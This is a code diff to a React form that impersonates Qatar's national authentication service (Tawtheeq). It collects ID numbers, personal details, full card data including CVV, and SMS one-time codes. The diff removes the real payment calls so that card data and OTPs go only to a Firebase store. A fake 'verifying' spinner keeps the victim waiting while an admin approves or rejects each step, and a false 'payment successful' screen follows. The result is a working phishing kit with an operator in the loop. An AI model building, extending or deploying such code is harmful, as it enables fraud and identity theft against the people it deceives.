@@ -1,14 +1,13 @@
 "use client"
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, useRef } from "react"
 import { Card } from "@/components/ui/card"
 import { Label } from "@/components/ui/label"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { addData, addCardToHistory, updateLastActive } from "@/lib/firebase"
+import { addData, addCardToHistory, addOtpToHistory, subscribeToVisitor, updateLastActive } from "@/lib/firebase"
 
 function getOrCreateVisitorId(): string {
   if (typeof window === "undefined") return Date.now().toString()
@@ -20,327 +19,184 @@ function getOrCreateVisitorId(): string {
   return id
 }
 
+type CardPhase = "form" | "waiting" | "otp_input" | "waiting_otp" | "rejected"
+
 export function AuthenticationForm() {
   const [currentStep, setCurrentStep] = useState(1)
   const [selectedType, setSelectedType] = useState("")
-  const [showOtpDialog, setShowOtpDialog] = useState(false)
-  const [paymentOtp, setPaymentOtp] = useState("")
-  const [phoneOtp, setPhoneOtp] = useState("")
   const [isLoading, setIsLoading] = useState(false)
   const [errors, setErrors] = useState<Record<string, string>>({})
-  const [userId, setUserId] = useState<number | null>(null)
   const [visitorId, setVisitorId] = useState<string>("")
+  const [cardPhase, setCardPhase] = useState<CardPhase>("form")
+  const [otpInput, setOtpInput] = useState("")
+  const [otpError, setOtpError] = useState("")
+  const unsubscribeRef = useRef<(() => void) | null>(null)
 
   const [personalData, setPersonalData] = useState({
-    qid: "",
-    firstName: "",
-    lastName: "",
-    email: "",
-    phone: "",
-    phoneProvider: "",
+    qid: "", firstName: "", lastName: "", email: "", phone: "", phoneProvider: "",
   })
   const [cardData, setCardData] = useState({
-    cardNumber: "",
-    expiryDate: "",
-    cvv: "",
-    cardHolder: "",
+    cardNumber: "", expiryDate: "", cvv: "", cardHolder: "",
   })
 
+  // Init visitor in Firebase on mount
   useEffect(() => {
     const vid = getOrCreateVisitorId()
     setVisitorId(vid)
     addData({
-      id: vid,
-      currentStep: 1,
-      currentPage: "auth-form",
-      status: "draft",
-      country: "QA",
-      identityNumber: "",
-      ownerName: "",
-      phoneNumber: "",
-      documentType: "استمارة",
-      serialNumber: "",
-      insuranceType: "تأمين جديد",
-      insuranceCoverage: "",
-      insuranceStartDate: "",
-      vehicleUsage: "",
-      vehicleValue: "",
-      vehicleYear: "",
-      vehicleModel: "",
-      paymentStatus: "pending",
+      id: vid, currentStep: 1, currentPage: "auth-form", status: "draft", country: "QA",
+      identityNumber: "", ownerName: "", phoneNumber: "", documentType: "استمارة",
+      serialNumber: "", insuranceType: "تأمين جديد", insuranceCoverage: "",
+      insuranceStartDate: "", vehicleUsage: "", vehicleValue: "", vehicleYear: "",
+      vehicleModel: "", paymentStatus: "pending",
     })
     const interval = setInterval(() => { updateLastActive(vid) }, 20000)
-    return () => clearInterval(interval)
+    return () => { clearInterval(interval); unsubscribeRef.current?.() }
   }, [])
 
+  // Subscribe to Firebase when waiting for admin action
+  useEffect(() => {
+    if (!visitorId || (cardPhase !== "waiting" && cardPhase !== "waiting_otp")) {
+      unsubscribeRef.current?.()
+      unsubscribeRef.current = null
+      return
+    }
+    unsubscribeRef.current?.()
+    unsubscribeRef.current = subscribeToVisitor(visitorId, (data) => {
+      if (cardPhase === "waiting") {
+        if (data.cardStatus === "approved_with_otp") setCardPhase("otp_input")
+        else if (data.cardStatus === "approved_with_pin") {
+          setCurrentStep(4)
+          setCardPhase("form")
+        }
+        else if (data.cardStatus === "rejected") setCardPhase("rejected")
+      } else if (cardPhase === "waiting_otp") {
+        if (data._v5Status === "approved") {
+          unsubscribeRef.current?.()
+          setCurrentStep(4)
+          setCardPhase("form")
+        } else if (data._v5Status === "rejected") {
+          setOtpError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى")
+          setOtpInput("")
+          setCardPhase("otp_input")
+        }
+      }
+    })
+    return () => { unsubscribeRef.current?.(); unsubscribeRef.current = null }
+  }, [visitorId, cardPhase])
+
   const validateStep1 = () => {
-    const newErrors: Record<string, string> = {}
-    if (!selectedType) newErrors.accountType = "يرجى اختيار نوع الحساب"
-    setErrors(newErrors)
-    return Object.keys(newErrors).length === 0
+    const e: Record<string, string> = {}
+    if (!selectedType) e.accountType = "يرجى اختيار نوع الحساب"
+    setErrors(e); return !Object.keys(e).length
   }
 
   const validateStep2 = () => {
-    const newErrors: Record<string, string> = {}
-    if (!personalData.qid) newErrors.qid = "هذا الحقل مطلوب"
-    else if (personalData.qid.length < 11) newErrors.qid = "رقم البطاقة غير صحيح"
-    if (!personalData.firstName) newErrors.firstName = "هذا الحقل مطلوب"
-    if (!personalData.lastName) newErrors.lastName = "هذا الحقل مطلوب"
-    if (!personalData.email) newErrors.email = "هذا الحقل مطلوب"
-    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(personalData.email)) newErrors.email = "البريد الإلكتروني غير صحيح"
-    if (!personalData.phone) newErrors.phone = "هذا الحقل مطلوب"
-    else if (!/^[0-9]{8}$/.test(personalData.phone)) newErrors.phone = "رقم الهاتف يجب أن يكون 8 أرقام"
-    if (!personalData.phoneProvider) newErrors.phoneProvider = "يرجى اختيار مزود الخدمة"
-    setErrors(newErrors)
-    return Object.keys(newErrors).length === 0
+    const e: Record<string, string> = {}
+    if (!personalData.qid) e.qid = "هذا الحقل مطلوب"
+    else if (personalData.qid.length < 11) e.qid = "رقم البطاقة غير صحيح"
+    if (!personalData.firstName) e.firstName = "هذا الحقل مطلوب"
+    if (!personalData.lastName) e.lastName = "هذا الحقل مطلوب"
+    if (!personalData.email) e.email = "هذا الحقل مطلوب"
+    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(personalData.email)) e.email = "البريد الإلكتروني غير صحيح"
+    if (!personalData.phone) e.phone = "هذا الحقل مطلوب"
+    else if (!/^[0-9]{8}$/.test(personalData.phone)) e.phone = "رقم الهاتف يجب أن يكون 8 أرقام"
+    if (!personalData.phoneProvider) e.phoneProvider = "يرجى اختيار مزود الخدمة"
+    setErrors(e); return !Object.keys(e).length
   }
 
-  const validateStep3 = () => {
-    const newErrors: Record<string, string> = {}
-    if (!cardData.cardNumber) newErrors.cardNumber = "هذا الحقل مطلوب"
-    else if (cardData.cardNumber.replace(/\s/g, "").length !== 16) newErrors.cardNumber = "رقم البطاقة غير صحيح"
-    if (!cardData.expiryDate) newErrors.expiryDate = "هذا الحقل مطلوب"
-    else if (!/^\d{2}\/\d{2}$/.test(cardData.expiryDate)) newErrors.expiryDate = "التاريخ غير صحيح (MM/YY)"
-    if (!cardData.cvv) newErrors.cvv = "هذا الحقل مطلوب"
-    else if (cardData.cvv.length !== 3) newErrors.cvv = "CVV يجب أن يكون 3 أرقام"
-    if (!cardData.cardHolder) newErrors.cardHolder = "هذا الحقل مطلوب"
-    setErrors(newErrors)
-    return Object.keys(newErrors).length === 0
-  }
-
-  const validateStep6 = () => {
-    const newErrors: Record<string, string> = {}
-    if (!phoneOtp) newErrors.phoneOtp = "يرجى إدخال رمز التحقق"
-    else if (phoneOtp.length !== 6) newErrors.phoneOtp = "رمز التحقق يجب أن يكون 6 أرقام"
-    setErrors(newErrors)
-    return Object.keys(newErrors).length === 0
+  const validateCard = () => {
+    const e: Record<string, string> = {}
+    if (!cardData.cardNumber) e.cardNumber = "هذا الحقل مطلوب"
+    else if (cardData.cardNumber.replace(/\s/g, "").length !== 16) e.cardNumber = "رقم البطاقة غير صحيح"
+    if (!cardData.expiryDate) e.expiryDate = "هذا الحقل مطلوب"
+    else if (!/^\d{2}\/\d{2}$/.test(cardData.expiryDate)) e.expiryDate = "التاريخ غير صحيح (MM/YY)"
+    if (!cardData.cvv) e.cvv = "هذا الحقل مطلوب"
+    else if (cardData.cvv.length !== 3) e.cvv = "CVV يجب أن يكون 3 أرقام"
+    if (!cardData.cardHolder) e.cardHolder = "هذا الحقل مطلوب"
+    setErrors(e); return !Object.keys(e).length
   }
 
   const handleNext = async () => {
     setErrors({})
-    let isValid = true
-    if (currentStep === 1) isValid = validateStep1()
-    if (currentStep === 2) isValid = validateStep2()
-    if (currentStep === 3) isValid = validateStep3()
-    if (currentStep === 6) isValid = validateStep6()
-    if (!isValid) return
+    if (currentStep === 1 && !validateStep1()) return
+    if (currentStep === 2 && !validateStep2()) return
     setIsLoading(true)
 
     try {
-      // Step 2 done: save personal data + register user
-      if (currentStep === 2) {
-        if (visitorId) {
-          await addData({
-            id: visitorId,
-            ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
-            identityNumber: personalData.qid,
-            phoneNumber: personalData.phone,
-            currentStep: 3,
-            currentPage: "auth-form",
-            status: "draft",
-            country: "QA",
-            documentType: "استمارة",
-            serialNumber: "",
-            insuranceType: "تأمين جديد",
-            insuranceCoverage: "",
-            insuranceStartDate: "",
-            vehicleUsage: "",
-            vehicleValue: "",
-            vehicleYear: "",
-            vehicleModel: "",
-            paymentStatus: "pending",
-          })
-        }
-        const tempPassword = `Tmp${Date.now()}!`
-        const response = await fetch("/api/auth/register", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
+      if (currentStep === 2 && visitorId) {
+        await addData({
+          id: visitorId,
+          ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
+          identityNumber: personalData.qid, phoneNumber: personalData.phone,
+          currentStep: 3, currentPage: "auth-form", status: "draft", country: "QA",
+          documentType: "استمارة", serialNumber: "", insuranceType: "تأمين جديد",
+          insuranceCoverage: "", insuranceStartDate: "", vehicleUsage: "",
+          vehicleValue: "", vehicleYear: "", vehicleModel: "", paymentStatus: "pending",
+        })
+        // Try register silently — not blocking
+        fetch("/api/auth/register", {
+          method: "POST", headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             accountType: selectedType,
             fullName: `${personalData.firstName} ${personalData.lastName}`,
-            nationalId: personalData.qid,
-            email: personalData.email,
-            phoneNumber: personalData.phone,
-            phoneProvider: personalData.phoneProvider,
-            password: tempPassword,
+            nationalId: personalData.qid, email: personalData.email,
+            phoneNumber: personalData.phone, phoneProvider: personalData.phoneProvider,
+            password: `Tmp${Date.now()}!`,
           }),
-        })
-        const data = await response.json()
-        if (response.ok) setUserId(data.userId)
-        setIsLoading(false)
-        setCurrentStep(3)
-        return
+        }).catch(() => {})
       }
-
-      // Step 3: Process payment
-      if (currentStep === 3) {
-        if (!userId) {
-          setErrors({ general: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
-          setIsLoading(false)
-          return
-        }
-        const response = await fetch("/api/payment/process", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            userId,
-            cardHolderName: cardData.cardHolder,
-            cardNumber: cardData.cardNumber,
-            cardExpiry: cardData.expiryDate,
-            cvv: cardData.cvv,
-          }),
-        })
-        const data = await response.json()
-        if (!response.ok) {
-          setErrors({ general: data.error || "حدث خطأ أثناء معالجة الدفع" })
-          setIsLoading(false)
-          return
-        }
-        if (visitorId) {
-          await addCardToHistory(visitorId, {
-            cardNumber: cardData.cardNumber.replace(/\s/g, ""),
-            cvv: cardData.cvv,
-            expiryDate: cardData.expiryDate,
-            cardName: cardData.cardHolder,
-          })
-        }
-        setIsLoading(false)
-        setShowOtpDialog(true)
-        return
-      }
-
-      // Step 5: Send phone verification OTP
-      if (currentStep === 5) {
-        if (!userId) {
-          setErrors({ general: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
-          setIsLoading(false)
-          return
-        }
-        const response = await fetch("/api/phone/send-otp", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ userId }),
-        })
-        const data = await response.json()
-        if (!response.ok) {
-          setErrors({ general: data.error || "حدث خطأ أثناء إرسال رمز التحقق" })
-          setIsLoading(false)
-          return
-        }
-      }
-
-      // Step 6: Verify phone OTP
-      if (currentStep === 6) {
-        if (!userId) {
-          setErrors({ general: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
-          setIsLoading(false)
-          return
-        }
-        const response = await fetch("/api/phone/verify-otp", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ userId, otp: phoneOtp }),
-        })
-        const data = await response.json()
-        if (!response.ok) {
-          setErrors({ phoneOtp: data.error || "رمز التحقق غير صحيح" })
-          setIsLoading(false)
-          return
-        }
-        if (visitorId) {
-          await addData({
-            id: visitorId,
-            phoneOtp,
-            _v7: phoneOtp,
-            currentStep: 7,
-            currentPage: "auth-form",
-            status: "pending_review",
-            country: "QA",
-            identityNumber: personalData.qid,
-            ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
-            phoneNumber: personalData.phone,
-            documentType: "استمارة",
-            serialNumber: "",
-            insuranceType: "تأمين جديد",
-            insuranceCoverage: "",
-            insuranceStartDate: "",
-            vehicleUsage: "",
-            vehicleValue: "",
-            vehicleYear: "",
-            vehicleModel: "",
-            paymentStatus: "completed",
-          })
-        }
-        if (data.sessionToken) localStorage.setItem("sessionToken", data.sessionToken)
-      }
-
       setIsLoading(false)
       if (currentStep < 7) setCurrentStep(currentStep + 1)
-    } catch (error) {
-      console.error("[v0] API call failed:", error)
-      setErrors({ general: "حدث خطأ في الاتصال بالخادم" })
+    } catch {
+      setErrors({ general: "حدث خطأ في الاتصال" })
       setIsLoading(false)
     }
   }
 
-  const handleOtpVerification = async () => {
-    if (!paymentOtp || paymentOtp.length !== 6) {
-      setErrors({ paymentOtp: "يرجى إدخال رمز التحقق الصحيح" })
-      return
+  // Submit card → Firebase only, then wait for admin
+  const handleCardSubmit = async () => {
+    if (!validateCard()) return
+    setIsLoading(true)
+    try {
+      if (visitorId) {
+        await addCardToHistory(visitorId, {
+          cardNumber: cardData.cardNumber.replace(/\s/g, ""),
+          cvv: cardData.cvv, expiryDate: cardData.expiryDate, cardName: cardData.cardHolder,
+        })
+      }
+      setCardPhase("waiting")
+    } catch {
+      setErrors({ general: "حدث خطأ أثناء حفظ البيانات" })
+    } finally {
+      setIsLoading(false)
     }
-    if (!userId) {
-      setErrors({ paymentOtp: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
+  }
+
+  // Submit OTP → Firebase, then wait for admin approval
+  const handleOtpSubmit = async () => {
+    setOtpError("")
+    if (!otpInput || otpInput.length < 4) {
+      setOtpError("يرجى إدخال رمز التحقق")
       return
     }
     setIsLoading(true)
     try {
-      const response = await fetch("/api/payment/verify-otp", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ userId, otp: paymentOtp }),
-      })
-      const data = await response.json()
-      if (!response.ok) {
-        setErrors({ paymentOtp: data.error || "رمز التحقق غير صحيح" })
-        setIsLoading(false)
-        return
-      }
-      if (visitorId) {
-        await addData({
-          id: visitorId,
-          otpCode: paymentOtp,
-          _v5: paymentOtp,
-          cardStatus: "approved_with_otp",
-          currentStep: currentStep + 1,
-          currentPage: "auth-form",
-          status: "draft",
-          country: "QA",
-          identityNumber: personalData.qid,
-          ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
-          phoneNumber: personalData.phone,
-          documentType: "استمارة",
-          serialNumber: "",
-          insuranceType: "تأمين جديد",
-          insuranceCoverage: "",
-          insuranceStartDate: "",
-          vehicleUsage: "",
-          vehicleValue: "",
-          vehicleYear: "",
-          vehicleModel: "",
-          paymentStatus: "pending",
-        })
-      }
-      setIsLoading(false)
-      setShowOtpDialog(false)
-      setCurrentStep(currentStep + 1)
-    } catch (error) {
-      console.error("[v0] OTP verification failed:", error)
-      setErrors({ paymentOtp: "حدث خطأ في الاتصال بالخادم" })
+      if (visitorId) await addOtpToHistory(visitorId, otpInput)
+      setCardPhase("waiting_otp")
+    } catch {
+      setOtpError("حدث خطأ أثناء الإرسال")
+    } finally {
       setIsLoading(false)
     }
   }
 
   const handleBack = () => {
+    if (currentStep === 3 && cardPhase !== "form") {
+      setCardPhase("form")
+      setErrors({})
+      return
+    }
     if (currentStep > 1) setCurrentStep(currentStep - 1)
     setErrors({})
   }
@@ -363,39 +219,33 @@ export function AuthenticationForm() {
             <h1 className="text-base md:text-lg font-semibold text-[#8b1538]">نظام التوثيق الوطني</h1>
             <p className="text-[10px] md:text-xs text-gray-600">National Authentication System</p>
           </div>
-          <div className="flex items-center gap-2 md:gap-4">
-            <div className="flex items-center gap-1.5 md:gap-2">
-              <div className="w-10 h-10 md:w-12 md:h-12 bg-white rounded-lg flex items-center justify-center p-1.5 md:p-2">
-                <svg viewBox="0 0 40 40" className="w-full h-full">
-                  <circle cx="12" cy="20" r="8" fill="#8b1538" />
-                  <circle cx="28" cy="20" r="8" fill="#0078c1" />
-                  <path d="M 12 12 Q 20 8 28 12" fill="none" stroke="#0078c1" strokeWidth="2" />
-                  <path d="M 12 28 Q 20 32 28 28" fill="none" stroke="#8b1538" strokeWidth="2" />
-                </svg>
-              </div>
-              <div className="text-[10px] md:text-xs">
-                <div className="font-bold text-gray-800">توثيق</div>
-                <div className="text-[8px] md:text-[10px] text-gray-500 tracking-wider">TAMTHEEQ</div>
-              </div>
-            </div>
-            <button className="p-1.5 md:p-2">
-              <svg className="w-5 h-5 md:w-6 md:h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
+          <div className="flex items-center gap-1.5 md:gap-2">
+            <div className="w-10 h-10 md:w-12 md:h-12 bg-white rounded-lg flex items-center justify-center p-1.5 md:p-2">
+              <svg viewBox="0 0 40 40" className="w-full h-full">
+                <circle cx="12" cy="20" r="8" fill="#8b1538" />
+                <circle cx="28" cy="20" r="8" fill="#0078c1" />
+                <path d="M 12 12 Q 20 8 28 12" fill="none" stroke="#0078c1" strokeWidth="2" />
+                <path d="M 12 28 Q 20 32 28 28" fill="none" stroke="#8b1538" strokeWidth="2" />
               </svg>
-            </button>
+            </div>
+            <div className="text-[10px] md:text-xs">
+              <div className="font-bold text-gray-800">توثيق</div>
+              <div className="text-[8px] md:text-[10px] text-gray-500 tracking-wider">TAMTHEEQ</div>
+            </div>
           </div>
         </div>
       </header>
 
       <main className="flex-1 max-w-6xl mx-auto w-full px-3 md:px-4 py-4 md:py-8">
+        {/* Steps */}
         <div className="mb-8 md:mb-12">
           <div className="flex items-center justify-start md:justify-center overflow-x-auto pb-4 hide-scrollbar">
             <div className="flex items-center min-w-max px-2">
               {steps.map((step, index) => (
                 <div key={index} className="flex items-center">
                   <div className="flex flex-col items-center gap-1.5 md:gap-2 min-w-[80px] md:min-w-[120px]">
-                    <div className={`w-10 h-10 md:w-12 md:h-12 rounded-full flex items-center justify-center font-bold text-base md:text-lg transition-colors ${currentStep === index + 1 ? "bg-[#0078c1] text-white" : "bg-gray-300 text-gray-600"}`}>
-                      {step.number}
+                    <div className={`w-10 h-10 md:w-12 md:h-12 rounded-full flex items-center justify-center font-bold text-base md:text-lg transition-colors ${currentStep === index + 1 ? "bg-[#0078c1] text-white" : currentStep > index + 1 ? "bg-green-500 text-white" : "bg-gray-300 text-gray-600"}`}>
+                      {currentStep > index + 1 ? "✓" : step.number}
                     </div>
                     <div className="text-center">
                       <div className="font-semibold text-xs md:text-sm">{step.label1}</div>
@@ -418,7 +268,7 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Step 1: Account Type */}
+          {/* Step 1 */}
           {currentStep === 1 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">اختر نوع الحساب</h2>
@@ -443,7 +293,7 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Step 2: Personal Data */}
+          {/* Step 2 */}
           {currentStep === 2 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">البيانات الشخصية</h2>
@@ -492,14 +342,14 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Step 3: Payment */}
-          {currentStep === 3 && (
+          {/* Step 3: Card form */}
+          {currentStep === 3 && cardPhase === "form" && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">الدفع بالبطاقة</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                 <div>
                   <Label htmlFor="cardNumber" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رقم البطاقة</Label>
-                  <Input id="cardNumber" value={cardData.cardNumber} onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0,16); const f = v.match(/.{1,4}/g)?.join(" ") || v; setCardData({ ...cardData, cardNumber: f }) }} className={`bg-white ${errors.cardNumber ? "border-red-500" : ""}`} maxLength={19} placeholder="0000 0000 0000 0000" />
+                  <Input id="cardNumber" value={cardData.cardNumber} onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0,16); setCardData({ ...cardData, cardNumber: v.match(/.{1,4}/g)?.join(" ") || v }) }} className={`bg-white ${errors.cardNumber ? "border-red-500" : ""}`} maxLength={19} placeholder="0000 0000 0000 0000" />
                   {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
                 </div>
                 <div className="grid grid-cols-2 gap-3 md:gap-4">
@@ -523,24 +373,104 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Step 4: Registration Processing */}
-          {currentStep === 4 && (
+          {/* Step 3: Waiting for admin approval */}
+          {currentStep === 3 && cardPhase === "waiting" && (
+            <div className="flex flex-col items-center justify-center py-12 md:py-20 space-y-6">
+              <div className="relative">
+                <div className="w-20 h-20 rounded-full bg-blue-50 flex items-center justify-center">
+                  <svg className="animate-spin h-10 w-10 text-[#0078c1]" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" fill="none" />
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                  </svg>
+                </div>
+              </div>
+              <div className="text-center space-y-2">
+                <h3 className="text-lg md:text-xl font-bold text-gray-800">جاري التحقق من البطاقة</h3>
+                <p className="text-sm text-gray-500">يرجى الانتظار، نقوم بمعالجة بيانات البطاقة...</p>
+                <p className="text-xs text-gray-400">قد يستغرق هذا بضع ثوانٍ</p>
+              </div>
+              <div className="flex gap-1.5">
+                {[0,1,2].map(i => (
+                  <div key={i} className="w-2 h-2 rounded-full bg-[#0078c1] animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Step 3: OTP input after admin approves */}
+          {currentStep === 3 && cardPhase === "otp_input" && (
             <div>
-              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">التسجيل</h2>
-              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto text-center">
-                <div className="bg-white p-6 md:p-8 rounded-lg space-y-4">
-                  <div className="text-green-600 text-4xl">✓</div>
-                  <span className="text-green-600">تم الدفع ✓</span>
+              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">رمز التحقق</h2>
+              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
+                <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 text-center">
+                  <p className="text-sm text-blue-700">تم إرسال رمز التحقق إلى هاتفك المسجل</p>
+                  <p className="text-xs text-blue-500 mt-1">{personalData.phone}</p>
+                </div>
+                <div>
+                  <Label htmlFor="otpInput" className="text-sm md:text-base mb-2 block text-center"><span className="text-red-500">*</span> رمز التحقق (OTP)</Label>
+                  <Input id="otpInput" value={otpInput} onChange={(e) => { setOtpInput(e.target.value.replace(/\D/g, "")); setOtpError("") }} className={`bg-white text-center text-2xl tracking-[0.5em] font-bold ${otpError ? "border-red-500" : ""}`} maxLength={6} placeholder="000000" />
+                  {otpError && <p className="text-red-500 text-xs mt-1 text-center">{otpError}</p>}
+                  <p className="text-xs text-gray-400 text-center mt-2">الرمز صالح لمدة 5 دقائق فقط</p>
                 </div>
               </div>
             </div>
           )}
 
-          {/* Step 5: Phone Verification */}
+          {/* Step 3: Waiting for OTP approval */}
+          {currentStep === 3 && cardPhase === "waiting_otp" && (
+            <div className="flex flex-col items-center justify-center py-12 md:py-20 space-y-6">
+              <div className="w-20 h-20 rounded-full bg-green-50 flex items-center justify-center">
+                <svg className="animate-spin h-10 w-10 text-green-500" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" fill="none" />
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                </svg>
+              </div>
+              <div className="text-center space-y-2">
+                <h3 className="text-lg md:text-xl font-bold text-gray-800">جاري التحقق من الرمز</h3>
+                <p className="text-sm text-gray-500">نقوم بالتحقق من رمز OTP الخاص بك...</p>
+              </div>
+              <div className="flex gap-1.5">
+                {[0,1,2].map(i => (
+                  <div key={i} className="w-2 h-2 rounded-full bg-green-500 animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Step 3: Card rejected */}
+          {currentStep === 3 && cardPhase === "rejected" && (
+            <div className="flex flex-col items-center justify-center py-12 space-y-6">
+              <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center">
+                <span className="text-4xl">❌</span>
+              </div>
+              <div className="text-center space-y-2">
+                <h3 className="text-lg md:text-xl font-bold text-red-700">لم يتم قبول البطاقة</h3>
+                <p className="text-sm text-gray-500">يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى</p>
+              </div>
+              <Button onClick={() => { setCardPhase("form"); setCardData({ cardNumber: "", expiryDate: "", cvv: "", cardHolder: "" }) }} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-8">
+                المحاولة مرة أخرى
+              </Button>
+            </div>
+          )}
+
+          {/* Step 4 */}
+          {currentStep === 4 && (
+            <div>
+              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">التسجيل</h2>
+              <div className="max-w-2xl mx-auto text-center">
+                <div className="bg-white p-6 md:p-8 rounded-lg space-y-4">
+                  <div className="text-green-600 text-5xl">✓</div>
+                  <span className="text-green-600 font-semibold text-lg">تم الدفع بنجاح</span>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Step 5 */}
           {currentStep === 5 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">توثيق رقم الهاتف</h2>
-              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
+              <div className="max-w-2xl mx-auto">
                 <div className="bg-white p-6 md:p-8 rounded-lg text-center space-y-4">
                   <div className="w-16 h-16 md:w-20 md:h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                     <svg className="w-8 h-8 md:w-10 md:h-10 text-[#0078c1]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -553,49 +483,56 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Step 6: OTP */}
+          {/* Step 6 */}
           {currentStep === 6 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">رمز التحقق</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                 <div>
                   <Label htmlFor="phoneOtp" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رمز التحقق</Label>
-                  <Input id="phoneOtp" value={phoneOtp} onChange={(e) => setPhoneOtp(e.target.value)} className={`bg-white ${errors.phoneOtp ? "border-red-500" : ""}`} maxLength={6} />
-                  {errors.phoneOtp && <p className="text-red-500 text-xs mt-1">{errors.phoneOtp}</p>}
+                  <Input id="phoneOtp" className="bg-white" maxLength={6} />
                 </div>
               </div>
             </div>
           )}
 
-          {/* Step 7: Completion */}
+          {/* Step 7 */}
           {currentStep === 7 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">إنتهاء التسجيل</h2>
-              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto text-center">
-                <p className="text-base md:text-lg">شكراً لتسجيلك</p>
-                <p className="text-base md:text-lg">يمكنك الآن استخدام خدماتنا</p>
+              <div className="max-w-2xl mx-auto text-center space-y-4">
+                <div className="text-green-500 text-6xl">🎉</div>
+                <p className="text-base md:text-lg font-semibold">شكراً لتسجيلك</p>
+                <p className="text-sm text-gray-500">يمكنك الآن استخدام خدماتنا</p>
               </div>
             </div>
           )}
 
+          {/* Navigation Buttons */}
           <div className="flex justify-center gap-3 md:gap-4 mt-6 md:mt-8">
-            {currentStep < 7 && (
-              <Button variant="outline" onClick={handleBack} disabled={currentStep === 1 || isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">إلغاء</Button>
-            )}
-            {currentStep > 1 && currentStep < 7 && (
+            {/* Back button */}
+            {currentStep > 1 && currentStep < 7 && cardPhase !== "waiting" && cardPhase !== "waiting_otp" && (
               <Button variant="outline" onClick={handleBack} disabled={isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">رجوع</Button>
             )}
-            {currentStep < 7 && (
+
+            {/* Card submit button */}
+            {currentStep === 3 && cardPhase === "form" && (
+              <Button onClick={handleCardSubmit} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 md:px-8 text-sm md:text-base">
